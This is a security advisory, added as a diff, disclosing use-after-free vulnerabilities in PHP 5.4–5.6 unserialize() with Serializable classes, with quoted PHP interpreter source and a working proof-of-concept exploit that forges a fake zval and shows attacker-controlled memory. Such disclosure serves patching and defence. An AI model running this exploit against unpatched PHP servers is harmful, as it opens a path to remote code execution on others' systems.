@@ -1,0 +1,179 @@
+Use After Free Vulnerabilities in unserialize()
+
+Taoguang Chen <[@chtg](http://github.com/chtg)> 
+Write Date: 2015.7.31 
+Release Date: 2015.9.4
+
+Multiple use-after-free vulnerabilities were discovered in unserialize() with Serializable class that can be abused for leaking arbitrary memory blocks or execute arbitrary code remotely.
+
+Affected Versions
+------------
+Affected is PHP 5.6 < 5.6.12
+Affected is PHP 5.5 < 5.5.28
+Affected is PHP 5.4 < 5.4.44
+
+Credits
+------------
+This vulnerability was disclosed by Taoguang Chen.
+
+Description
+------------
+
+  if (ce->unserialize == NULL) {
+    zend_error(E_WARNING, "Class %s has no unserializer", ZSTR_VAL(ce->name));
+    object_init_ex(rval, ce);
+  } else if (ce->unserialize(rval, ce, (const unsigned char*)*p,
+datalen, (zend_unserialize_data *)var_hash) != SUCCESS) {
+    return 0;
+  }
+
+  (*p) += datalen;
+
+  return finish_nested_data(UNSERIALIZE_PASSTHRU);
+
+
+The unserialize() with Serializable class lead to various problems.
+
+i) Free the memory via crafted Serializable class
+
+
+<?php
+
+class obj implements Serializable {
+    var $data;
+    function serialize() {
+        return serialize($this->data);
+    }
+    function unserialize($data) {
+        $this->data = unserialize($data);
+        $this->data = 1;
+    }
+}
+
+?>
+
+
+ii) Free the memory via the process_nested_data() with a invalid
+serialized string
+
+
+static inline int process_nested_data(UNSERIALIZE_PARAMETER, HashTable
+*ht, long elements, int objprops)
+{
+  while (elements-- > 0) {
+    zval *key, *data, **old_data;
+
+    ...
+
+    ALLOC_INIT_ZVAL(data);
+
+    if (!php_var_unserialize(&data, p, max, var_hash TSRMLS_CC)) {
+      zval_dtor(key);
+      FREE_ZVAL(key);
+      zval_dtor(data);
+      FREE_ZVAL(data);  <===  free the memory
+      return 0;
+    }
+
+
+iii) Free the memory via the var_push_dtor_no_addref() with the var_destroy().
+
+
+PHPAPI void var_destroy(php_unserialize_data_t *var_hashx)
+{
+
+  ...
+  
+  while (var_hash) {
+    for (i = 0; i < var_hash->used_slots; i++) {
+      zval_ptr_dtor(&var_hash->data[i]);  <===  free the memory
+    }
+  
+  ...
+  
+PHPAPI int php_var_unserialize(UNSERIALIZE_PARAMETER)
+{
+
+  ...
+  
+  if (*rval != NULL) {
+    var_push_dtor_no_addref(var_hash, rval);
+  }
+  *rval = *rval_ref;
+
+
+We can create ZVAL and free it via Serializable::unserialize. However
+the unserialize() will still allow to use R: or r: to set references
+to that already freed memory. It is possible to use-after-free attack
+and execute arbitrary code remotely.
+
+Proof of Concept Exploit
+------------
+The PoC works on standard MacOSX 10.11 installation of PHP 5.4.43.
+
+
+<?php
+
+$fakezval = ptr2str(1122334455);
+$fakezval .= ptr2str(0);
+$fakezval .= "\x00\x00\x00\x00";
+$fakezval .= "\x01";
+$fakezval .= "\x00";
+$fakezval .= "\x00\x00";
+
+// i)
+//$inner = 'a:1:{i:0;i:1;}';
+//$exploit = 'a:2:{i:0;C:3:"obj":'.strlen($inner).':{'.$inner.'}i:1;R:3;}';
+// ii)
+$inner = 'a:2:{i:0;i:1;i:1;i:2';
+$exploit = 'a:2:{i:0;C:3:"obj":'.strlen($inner).':{'.$inner.'}i:1;R:5;}';
+// iii)
+//$inner = 'r:1;';
+//$exploit = 'a:1:{i:0;C:3:"obj":'.strlen($inner).':{'.$inner.'}}';
+
+$data = unserialize($exploit);
+
+for ($i = 0; $i < 5; $i++) {
+    $v[$i] = $fakezval.$i;
+}
+
+var_dump($data);
+
+function ptr2str($ptr)
+{
+  $out = "";
+  for ($i = 0; $i < 8; $i++) {
+    $out .= chr($ptr & 0xff);
+    $ptr >>= 8;
+  }
+  return $out;
+}
+
+class obj implements Serializable {
+  var $data;
+  function serialize() {
+    return serialize($this->data);
+  }
+  function unserialize($data) {
+        $this->data = unserialize($data);
+//    i)
+//    $this->data = '1';
+  }
+}
+
+?>
+
+
+Test the PoC on the command line:
+
+
+$ php uafpoc.php
+array(2) {
+  [0]=>
+  object(obj)#1 (1) {
+    ["data"]=>
+    bool(false)
+  }
+  [1]=>
+  int(1122334455)  <===  so we can control the memory and create fake ZVAL :)
+}
